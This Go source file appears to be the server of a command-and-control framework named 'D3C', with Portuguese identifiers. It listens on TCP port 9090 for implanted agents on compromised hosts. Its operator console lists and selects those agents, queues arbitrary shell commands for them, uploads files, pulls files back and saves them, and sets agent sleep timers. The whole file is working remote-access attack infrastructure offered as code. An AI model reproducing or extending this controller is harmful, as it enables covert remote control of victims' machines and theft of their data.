package main

import (
	"bufio"
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"encoding/gob"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
)

var (
	agentesEmCampo    = []estruturas.Mensagem{}
	agenteSelecionado = ""
)

func main() {
	log.Println("Entrei em execução.")

	go startListener("9090")

	cliHandler()
}

func cliHandler() {
	for {
		if agenteSelecionado != "" {
			print(agenteSelecionado + "@D3C# ")
		} else {
			print("D3C> ")
		}

		// ls -lsa
		reader := bufio.NewReader(os.Stdin)
		comandoCompleto, _ := reader.ReadString('\n')

		comandoSeparado := helpers.SeparaComando(comandoCompleto)
		comandoBase := strings.TrimSpace(comandoSeparado[0])

		if len(comandoBase) > 0 {
			switch comandoBase {
			case "show":
				showHandler(comandoSeparado)
			case "sleep":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					comandoSend := &estruturas.Commando{}
					comandoSend.Comando = comandoCompleto

					agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
				} else {
					log.Println("Escolha quantos segundos o Agente dele esperar.")
				}
			case "select":
				selectHandler(comandoSeparado)
			case "send":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					var erro error
					arquivoParaEnviar := &estruturas.Arquivo{}

					arquivoParaEnviar.Nome = comandoSeparado[1]
					arquivoParaEnviar.Conteudo, erro = os.ReadFile(arquivoParaEnviar.Nome)

					comandoSend := &estruturas.Commando{}
					comandoSend.Comando = comandoSeparado[0]
					comandoSend.Arquivo = *arquivoParaEnviar

					if erro != nil {
						log.Println("Erro ao abrir o arquivo: ", erro.Error())
					} else {
						agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
					}
				} else {
					log.Println("Especifique o arquivo a ser enviado.")
				}
			case "get":
				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
					comandoSend := &estruturas.Commando{}
					comandoSend.Comando = comandoCompleto

					agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)

				} else {
					log.Println("Especifique o arquivo que deseja copiar.")
				}
			default:
				if agenteSelecionado != "" {
					comando := &estruturas.Commando{}
					comando.Comando = comandoCompleto

					for indice, agente := range agentesEmCampo {
						if agente.AgentID == agenteSelecionado {
							// Adicionar na mensagem desse agente o comando recebido pela CLI
							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *comando)
						}
					}
				} else {
					log.Println("O comando digitado não existe!")
				}
			}
		}

	}

}

func showHandler(comando []string) {
	if len(comando) > 1 {
		switch comando[1] {
		case "agentes":
			for _, agente := range agentesEmCampo {
				println("Agente ID: " + agente.AgentID + "->" + agente.AgentHostname + "@" + agente.AgentCWD)
			}
		default:
			log.Println("O parâmetro selecionado não existe.")
		}
	}
}

func selectHandler(comando []string) {
	if len(comando) > 1 {
		if agenteCadastrado(comando[1]) {
			agenteSelecionado = comando[1]
		} else {
			log.Println("O Agente selecionado não está em campo.")
			log.Println("Para listar os Agentes em campo use: show agentes.")
		}
	} else {
		agenteSelecionado = ""
	}
}

func agenteCadastrado(agentID string) (cadastrado bool) {
	cadastrado = false

	for _, agente := range agentesEmCampo {
		if agente.AgentID == agentID {
			cadastrado = true
		}
	}

	return cadastrado
}

func mensagemContemResposta(mensagem estruturas.Mensagem) (contem bool) {
	contem = false

	for _, comando := range mensagem.Comandos {
		if len(comando.Resposta) > 0 {
			contem = true
		}
	}

	return contem
}

func posicaoAgenteEmCampo(agenteId string) (posicao int) {
	for indice, agente := range agentesEmCampo {
		if agenteId == agente.AgentID {
			posicao = indice
		}
	}
	return posicao
}

func salvarArquivo(arquivo estruturas.Arquivo) {
	err := ioutil.WriteFile(arquivo.Nome, arquivo.Conteudo, 644)

	if err != nil {
		log.Println("Erro ao salvar o arquivo recebido: ", err.Error())
	}
}
func startListener(port string) {
	// tcp->0.0.0.0:9090
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Erro ao iniciar o listener: ", err.Error())
	} else {
		for {
			canal, err := listener.Accept()
			defer canal.Close()

			if err != nil {
				log.Println("Erro em um novo canal: ", err.Error())
			} else {
				mensagem := &estruturas.Mensagem{}

				gob.NewDecoder(canal).Decode(mensagem)

				// Verificar se o Agente ja foi apresentado anteriormente
				if agenteCadastrado(mensagem.AgentID) {
					if mensagemContemResposta(*mensagem) {
						log.Println("Resposta do Host: ", mensagem.AgentHostname)
						// Exibir as respostas
						for indice, comando := range mensagem.Comandos {
							log.Println("Resposta do Comando: ", comando.Comando)
							println(comando.Resposta)
							if helpers.SeparaComando(comando.Comando)[0] == "get" &&
								mensagem.Comandos[indice].Arquivo.Erro == false {
								salvarArquivo(mensagem.Comandos[indice].Arquivo)
							}
						}
					}
					// Enviar a lista de comandos enfileirados para o agente
					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)])
					// Zera a lista de comandos do agente
					agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)].Comandos = []estruturas.Commando{}
				} else {
					log.Println("Nova conexão: ", canal.RemoteAddr().String())
					log.Println("Agente ID: ", mensagem.AgentID)
					agentesEmCampo = append(agentesEmCampo, *mensagem)
					gob.NewEncoder(canal).Encode(mensagem)
				}
			}
		}
	}
}
